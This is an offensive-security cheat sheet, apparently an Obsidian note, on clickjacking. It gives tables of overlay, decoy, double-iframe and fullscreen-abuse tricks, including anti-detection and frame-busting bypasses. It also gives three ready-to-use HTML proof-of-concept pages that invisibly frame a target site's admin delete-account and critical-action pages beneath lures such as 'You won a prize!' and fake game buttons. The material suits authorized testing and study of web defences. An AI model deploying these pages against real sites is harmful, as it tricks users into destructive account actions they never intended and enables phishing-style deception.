---
aliases:
  - Iframe Overlay
  - Opacity Trick
  - Decoy Button
  - Double Iframe
tags:
  - type/cheatsheet
  - vuln/clickjacking
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Clickjacking]]'
---
# Clickjacking - Vectores Básicos

***

## Iframe Overlay con Opacity

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Opacity 0 + z-index | iframe transparent over visible decoy | Standard. |
| `opacity: 0.0001` | Almost invisible but renders | Anti-detection. |
| `opacity: 0` | Fully invisible (some browsers cancel events) | Edge. |
| Z-index high | iframe on top, captures clicks | Standard. |
| Z-index 9999+ | Force topmost | Reliable. |
| Position absolute | Precise placement | Standard. |
| Match decoy size | Iframe same dimensions as button | Pixel-perfect. |
| Pointer-events | `pointer-events: auto` on iframe | Default behavior. |
| Combine con CSS animation | Smooth alignment | Stealth. |
| Mobile responsive | Adjust per viewport | Multi-device. |
| Combine con scroll | Scrolljacking variant | Edge. |
| Multi-step alignment | Multi-iframe overlay | Compound. |
| Padding/margin tricks | Adjust target hitbox | Precision. |
| Visibility hidden alternative | NOT — events don't fire | Don't use. |
^cj-vector-opacity

### Standard PoC

```html
<!DOCTYPE html>
<html>
<head>
<title>Win a prize!</title>
<style>
  body { margin: 0; padding: 0; }
  iframe {
    position: absolute;
    top: 0; left: 0;
    width: 100%; height: 100%;
    opacity: 0.0001;  /* invisible but rendered */
    z-index: 9999;     /* on top, captures clicks */
  }
  .decoy {
    position: absolute;
    top: 280px; left: 240px;
    z-index: 1;
    background: #4CAF50;
    color: white;
    padding: 16px 32px;
    font-size: 18px;
    font-weight: bold;
    border: none;
    border-radius: 4px;
  }
  .background {
    background: #f0f0f0;
    height: 100vh;
    text-align: center;
    padding-top: 200px;
    font-size: 32px;
  }
</style>
</head>
<body>
  <div class="background">
    <h1>You won a prize!</h1>
    <button class="decoy">CLAIM NOW</button>
  </div>
  <!-- iframe positioned exactly over button -->
  <iframe src="https://target.com/admin/delete-account"></iframe>
</body>
</html>
```

___

## Decoy Button Placement

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Identify target button position | Open target manually, note button x/y | Recon. |
| Match exact pixel position | iframe top/left = button position | Precision. |
| Multi-step interaction | Multiple decoy steps + multiple frame buttons | Multi-action chain. |
| Scroll padding | Add padding so target's button visible | Standard. |
| CSS transform trick | `transform: translate(...)` for precision | Modern. |
| Calc dimensions | Use `calc()` for responsive | Modern. |
| Per-browser tweaks | Different rendering | Edge. |
| Mobile considerations | Touch targets smaller | Mobile-specific. |
| Combine con timer | Reveal decoy after delay | UX. |
| Combine con animation | Distract user attention | Stealth. |
| Game-style decoy | "Click to play" UX | Engagement. |
| Survey decoy | Fake survey form | Multi-question. |
| OAuth-style decoy | "Sign in with Google" | Federation phishing. |
| Critical button overlap | Confirm dialog overlay | High impact. |
^cj-vector-decoy

___

## Double Iframe

| **Trick** | **Setup** | **Notas** |
|:---:|:---:|:---:|
| Concept | iframe wrapped en iframe — bypass some frame busting | Frame-busting bypass. |
| Outer iframe | `<iframe srcdoc="..."></iframe>` | Loaded inline. |
| Inner iframe | Inner src=victim | Standard. |
| Combine con sandbox | `<iframe sandbox>` outer | Removes JS protections. |
| Three-level nesting | Deeper bypass | Edge. |
| Combine con `srcdoc` attribute | Inline HTML content | Modern HTML5. |
| `<object data=...>` | Object tag alt | Edge. |
| `<embed>` tag | Embed alt | Edge. |
| `<applet>` legacy | Java applet | Deprecated. |
| `<frame>` tag | Legacy frames | Pre-iframe. |
| `<frameset>` | Legacy framesets | Pre-iframe. |
| Combine con history.push | Manipulate URL | Edge. |
| Per-context bypass | Different bypasses for different protections | Per-app. |
| Modern browser quirks | Per-browser nesting limits | Edge. |
^cj-vector-double-iframe

### Double iframe PoC

```html
<!DOCTYPE html>
<html>
<body>
<iframe srcdoc='
  <iframe src="https://target.com/admin/action" 
          style="opacity:0.0001;width:100%;height:100%"></iframe>
  <button style="position:absolute;top:300px;left:200px;z-index:1">
    Click here
  </button>
' style="width:100%;height:100vh"></iframe>
</body>
</html>
```

___

## Fullscreen Mode Abuse

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Atacante triggers fullscreen mode + overlay matches victim's UI | UX confusion. |
| `requestFullscreen()` | JS API (requires user gesture) | Standard. |
| Force fullscreen on click | Decoy button triggers fullscreen + frame action | Multi-purpose. |
| Esc to exit fullscreen | Browser shows brief notification — atacante times click before user reads | Window. |
| Combine con cursor jacking | UI confusion compound | Multi-vector. |
| Browser fullscreen warning | Brief notification — bypass via timing | Standard browsers. |
| Picture-in-picture API | Edge — if app supports | Edge. |
| Force minimal UI | Hide browser chrome | UX. |
| Tab navigation | If frame can tab to focused element | Keyboard hijack. |
| Combine con keyboard input | Multi-vector | Compound. |
| Mobile fullscreen | Different from desktop | Mobile-specific. |
| WebVR / WebXR fullscreen | Modern edge | Niche. |
^cj-vector-fullscreen

### Fullscreen overlay PoC

```html
<!DOCTYPE html>
<html>
<body>
<button onclick="goFullscreen()">Enter immersive game</button>
<script>
function goFullscreen() {
  document.documentElement.requestFullscreen();
  
  // After fullscreen, overlay iframe match real UI
  const iframe = document.createElement('iframe');
  iframe.src = 'https://target.com/admin/critical-action';
  iframe.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;opacity:0.0001;z-index:9999';
  document.body.appendChild(iframe);
  
  // Decoy fake fullscreen UI matching victim
  const decoy = document.createElement('div');
  decoy.innerHTML = '<button style="position:fixed;top:50%;left:50%;font-size:32px">PRESS ENTER</button>';
  document.body.appendChild(decoy);
}
</script>
</body>
</html>
```

***
